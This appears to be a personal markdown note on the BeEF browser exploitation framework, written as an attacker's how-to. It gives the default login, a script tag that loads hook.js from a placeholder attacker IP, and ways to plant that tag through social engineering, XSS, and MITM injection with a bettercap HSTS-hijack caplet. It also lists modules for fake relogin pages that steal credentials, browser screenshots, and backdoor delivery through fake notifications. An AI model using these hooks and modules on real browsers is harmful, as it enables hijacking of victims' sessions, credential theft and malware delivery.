---
title: BeEF
tags: [security, tool, web]
---

BeEF : Browser Exploitation Framework  
Makes use of JS to hook the target browser. Works on any platform as long as target device browser supported JS

Username : beef  
Password : password

<u>Hook URL</u>

````bash
<script src="http://<attacker-ip-address>:3000/hook.js"></script>
````

The URL can be sent to the target using various methods like Social Engineering, MITM attack with DNS spoofing, XSS or JS Injection after performing MITM attack

### Tabs Explained

Detail Tab : Browser Details  
Logs : Events that occurred in the browser  
Commands : Run various commands  
Proxy : Allows to use hooked browser as a proxy  
XssRays : Shows if page has any XSS vulnerabilities  
Network : Overview of current network

<u>Load Hook Script on all Sites (MITM + JS Injection)</u>

Inject Beef Code : <https://drive.google.com/file/d/1uCeGZKyP1Cj2UIORqYMrlFTyi9dLaCUa/view?usp=sharing>  
Add the JS Script in the HSTS Hijack caplet file and perform MITM attack

````bash
bettercap -iface <interface> -caplet <sniff-data-cap-file>
hstshijack/hstshijack (Run HSTS Caplet)
````

### Commands

1. <u>Create Alert Dialog</u>  
   Create an dialog box on the target browser
2. <u>Raw JavaScript</u>  
   Execute JS code on the target browser
3. <u>Spyder Eye</u>  
   Take screenshot of the target browser screen
4. <u>Redirect Browser</u>  
   Redirect the target to an different webpage
   Can be used to redirect to download an backdoor, fake login page, etc.
5. <u>Get Visited URL</u>  
   Check of a URL was visited by the target
6. <u>Pretty Theft</u>  
   Create fake relogin page to steal credentials
7. <u>Fake Notification Bar</u>  
   Send Backdoor, malicious code to user using an fake notification message  
   If sending an backdoor ensure to start "Multi Handler" to listen to the connection